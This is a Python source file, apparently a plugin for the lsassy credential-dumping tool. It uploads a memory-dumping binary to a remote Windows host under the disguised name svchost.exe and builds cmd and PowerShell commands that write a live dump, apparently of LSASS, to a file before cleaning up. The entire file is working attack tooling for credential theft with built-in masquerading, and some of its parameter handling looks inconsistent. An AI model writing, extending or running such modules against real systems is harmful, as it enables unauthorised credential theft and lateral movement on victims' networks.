from lsassy.dumpmethod import IDumpMethod, Dependency
from lsassy.logger import lsassy_logger


class DumpMethod(IDumpMethod):
    
    custom_dump_name_support = True
    custom_dump_path_support = True

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.dumper = Dependency("live_dumper", "svchost.exe")
        if self._time_between_commands == 1:
            self._time_between_commands = 10
        if self._timeout == 5:
            self._time_between_commands = 300

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.dumper])

    def clean(self):
        self.clean_dependencies([self.dumper])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        dumper_path = self.dumper.get_remote_path()
        full_dump_path = f"{self.dump_path}{self.dump_name}"
        
        cmd_command = (
            f'"{dumper_path}" -o {full_dump_path}'
        )
        
        pwsh_command = (
            f'& "{dumper_path}" -live -o "{full_dump_path}" '
        )
        
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }

